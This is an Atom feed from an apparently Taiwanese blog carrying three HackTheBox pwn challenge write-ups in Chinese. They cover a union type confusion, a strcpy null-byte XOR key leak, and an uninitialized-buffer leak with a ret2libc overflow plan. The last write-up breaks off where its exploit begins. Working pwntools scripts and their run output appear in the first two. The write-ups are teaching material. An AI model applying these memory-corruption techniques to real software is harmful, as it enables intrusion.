<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kazma&#39;s blog</title>
  
  <subtitle>Decoding My Life: Tales of Code, Cyber, and Campus Life</subtitle>
  <link href="https://kazma.tw/atom.xml" rel="self"/>
  
  <link href="https://kazma.tw/"/>
  <updated>2024-11-07T17:43:31.492Z</updated>
  <id>https://kazma.tw/</id>
  
  <author>
    <name>kazma</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HackTheBox-Challenges Entity Writeup</title>
    <link href="https://kazma.tw/2024/11/08/HackTheBox-Challenges-Entity-Writeup/"/>
    <id>https://kazma.tw/2024/11/08/HackTheBox-Challenges-Entity-Writeup/</id>
    <published>2024-11-07T17:25:58.479Z</published>
    <updated>2024-11-07T17:43:31.492Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題要考的是 Union 的類型混淆，DataStore 的宣告如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> integer;</span><br><span class="line">    <span class="type">char</span> <span class="built_in">string</span>[<span class="number">8</span>];</span><br><span class="line">&#125; DataStore;</span><br></pre></td></tr></table></figure></div><p>所以 integer 跟 string[8] 是存在同一個地方的，又程式的目標如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (DataStore.integer == <span class="number">13371337</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nSorry, this will not work!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>DataStore.integer 要是 13371337，但是設定的時候如果我們設定 13371337 他會因為下面的限制被結束掉：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_field</span><span class="params">(<span class="type">field_t</span> f)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMaybe try a ritual?\n\n&gt;&gt; &quot;</span>);</span><br><span class="line">    fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> (f) &#123;</span><br><span class="line">    <span class="keyword">case</span> INTEGER:</span><br><span class="line">        <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%llu&quot;</span>, &amp;DataStore.integer);</span><br><span class="line">        <span class="keyword">if</span> (DataStore.integer == <span class="number">13371337</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nWhat&#x27;s this nonsense?!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> STRING:</span><br><span class="line">        <span class="built_in">memcpy</span>(DataStore.<span class="built_in">string</span>, buf, <span class="keyword">sizeof</span>(DataStore.<span class="built_in">string</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>看到這裡我們先了解一件事情，如果我們希望 integer 被解釋成 13371337 那他實際存在記憶體的會是 0x0000000000CC7ACD，所以我們可以透過 p64(13371337) 把 byte 直接寫進去。<br>你們可能會搞混為什麼不是送 ‘13371337’ 進去，因為他會以 ascii 存在記憶體中，所以的差異在這。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;83.136.255.253&quot;</span>, <span class="number">40855</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;T&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;S&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, p64(<span class="number">13371337</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;C&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/pwn_entity.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這題要考的是 Union 的類型混淆，DataStore 的</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Vault-breaker Writeup</title>
    <link href="https://kazma.tw/2024/11/07/HackTheBox-Challenges-Vault-breaker-Writeup/"/>
    <id>https://kazma.tw/2024/11/07/HackTheBox-Challenges-Vault-breaker-Writeup/</id>
    <published>2024-11-06T16:39:57.584Z</published>
    <updated>2024-11-07T01:17:22.919Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題保護全開，然後程式主邏輯如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">new_key_gen</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> random_fd; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> random_fd2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 input_num; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  FILE *random_fp; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> key_buf[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  i = <span class="number">0LL</span>;</span><br><span class="line">  input_num = <span class="number">34LL</span>;</span><br><span class="line">  random_fp = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !random_fp )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;\n%sError opening /dev/urandom, exiting..\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">21</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( input_num &gt; <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*] Length of new password (0-%d): &quot;</span>, <span class="number">31LL</span>);</span><br><span class="line">    input_num = read_num();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(key_buf, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  random_fd = fileno(random_fp);</span><br><span class="line">  read(random_fd, key_buf, input_num);</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; input_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( !key_buf[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      random_fd2 = fileno(random_fp);</span><br><span class="line">      read(random_fd2, &amp;key_buf[i], <span class="number">1uLL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(random_key, key_buf);</span><br><span class="line">  fclose(random_fp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n%s[+] New key has been genereated successfully!\n%s&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>, <span class="string">&quot;\x1B[1;34m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>這邊的問題就是他會讓我們生成隨機長度的密鑰，但是他用 <code>strcpy</code> 而不是 <code>memcpy</code>，這導致他會把 null byte 也複製過去，所以我們就可以透過不同長度的密鑰來控制 null byte 的位置，而他做的就只是把 random key 跟 flag 做 xor 而剛好 xor 0 不會變。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>這邊提供兩種解法：</p><ol><li>第一種是假設我們密鑰等於 0 所以 random key 第一位就會等於 null byte，這時我們就可以看到 flag 的第一位，以此類推，我們從 0 到 31 就可以得到整個 flag：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;HTB&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>] != <span class="string">b&quot;&#125;&quot;</span>:</span><br><span class="line">    r = remote(<span class="string">&quot;94.237.52.225&quot;</span>, <span class="number">39459</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(flag)))</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Vault: &quot;</span>)</span><br><span class="line">    r.recv(<span class="built_in">len</span>(flag))</span><br><span class="line">    flag += r.recv(<span class="number">1</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>執行結果：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">└─$ python vault.py</span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4n&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_k&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_ku&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kud&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudu&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;\n&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;\n\n&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;\n\n\n&#x27;</span></span><br></pre></td></tr></table></figure></div>因為他 flag 有加換行所以沒有正常終止，可以改成 endswith 之類的。</li><li>第二種是我們從 31 設定回來，這樣 random key 就都會是 null byte：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.52.225&quot;</span>, <span class="number">39459</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i=&#125;</span>&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Vault: &quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>執行結果：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">└─$ python vault2.py</span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">i=31</span><br><span class="line">i=30</span><br><span class="line">i=29</span><br><span class="line">i=28</span><br><span class="line">i=27</span><br><span class="line">i=26</span><br><span class="line">i=25</span><br><span class="line">i=24</span><br><span class="line">i=23</span><br><span class="line">i=22</span><br><span class="line">i=21</span><br><span class="line">i=20</span><br><span class="line">i=19</span><br><span class="line">i=18</span><br><span class="line">i=17</span><br><span class="line">i=16</span><br><span class="line">i=15</span><br><span class="line">i=14</span><br><span class="line">i=13</span><br><span class="line">i=12</span><br><span class="line">i=11</span><br><span class="line">i=10</span><br><span class="line">i=9</span><br><span class="line">i=8</span><br><span class="line">i=7</span><br><span class="line">i=6</span><br><span class="line">i=5</span><br><span class="line">i=4</span><br><span class="line">i=3</span><br><span class="line">i=2</span><br><span class="line">i=1</span><br><span class="line">i=0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">HTB&#123;d4nz4_kudur0r0r0&#125;</span><br></pre></td></tr></table></figure></div></li></ol><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/vault_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這題保護全開，然後程式主邏輯如下：&lt;/p&gt;
&lt;div cla</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Space pirate: Retribution Writeup</title>
    <link href="https://kazma.tw/2024/11/06/HackTheBox-Challenges-Space-pirate-Retribution-Writeup/"/>
    <id>https://kazma.tw/2024/11/06/HackTheBox-Challenges-Space-pirate-Retribution-Writeup/</id>
    <published>2024-11-06T06:04:48.148Z</published>
    <updated>2024-11-06T07:11:15.380Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>直接來看這題的主邏輯和保護機制：<br>PIE 有開，有 canary，所以要 leak stack variable 然後 ret2libc </p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec ./sp_retribution</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/challenge3/sp_retribution&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b<span class="string">&#x27;./glibc/&#x27;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">missile_launcher</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0x53E5854620FB399F</span>LL;</span><br><span class="line">  v3 = <span class="number">0x576B96B95DF201F9</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n[*] Current target&#x27;s coordinates: x = [0x%lx], y = [0x%lx]\n\n[*] Insert new coordinates: x = [0x%lx], y = &quot;</span>,</span><br><span class="line">    <span class="number">0x53E5854620FB399F</span>LL,</span><br><span class="line">    <span class="number">0x576B96B95DF201F9</span>LL,</span><br><span class="line">    <span class="number">0x53E5854620FB399F</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): &quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x84</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           <span class="string">&quot;\n%s[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!%s\n&quot;</span>,</span><br><span class="line">           <span class="string">&quot;\x1B[1;31m&quot;</span>,</span><br><span class="line">           <span class="string">&quot;\x1B[1;34m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>可以看到有兩個明顯的漏洞。<br>首先是 buf 沒有被初始化，然後又被印出來，所以我們可以嘗試透過覆蓋不同長度的 offset 來找到可以用的 stack address 甚至是 libc address，這部分很多網路上的 writeup 都講錯，漏洞主因是沒有初始化才對。<br>然後第二個 read 是 bof 應該沒什麼問題，所以我們的目標就是 leak stack address，然後算出 pie base，接著利用 pie base call puts leak got 找 libc base，最後 bof system(‘&#x2F;bin&#x2F;sh’)。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span 